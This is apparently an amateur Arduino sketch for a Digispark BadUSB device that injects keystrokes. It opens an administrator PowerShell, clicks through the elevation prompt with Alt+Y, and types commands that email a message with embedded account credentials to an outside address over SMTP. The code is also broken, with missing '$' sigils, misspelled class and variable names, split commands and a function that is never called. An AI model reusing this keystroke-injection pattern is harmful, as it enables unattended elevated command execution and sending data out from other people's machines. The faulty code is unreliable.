#include <DigiKeyboard.h>

void setup() {
  // put your setup code here, to run once:
}

void sendEmail(){
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);

  DigiKeyboard.print("$EmailFrom = 'teste01@hotmail.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);  
  DigiKeyboard.print("$EmailTo = 'acauatunari@gmail.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  DigiKeyboard.print("Body = 'teste'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  DigiKeyboard.print("$SMTPTServer = 'smtp.live.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("SMTPCliente = New-Object");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("Net.Mail.SmtpCliente($SMTPServer, 587)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("$SMTPCliente.EnableSsl = $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("$SMTPCliente.Credentials = New-Object");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("System.Net.NetworkCredential('teste01@hotmail.com', '****')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);      
  DigiKeyboard.delay(3000);

  DigiKeyboard.print("$SMTPCliente.Send($EmailFrom, $EmailTo, $Body)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);      

}

void loop() {
  // put your main code here, to run repeatedly:
}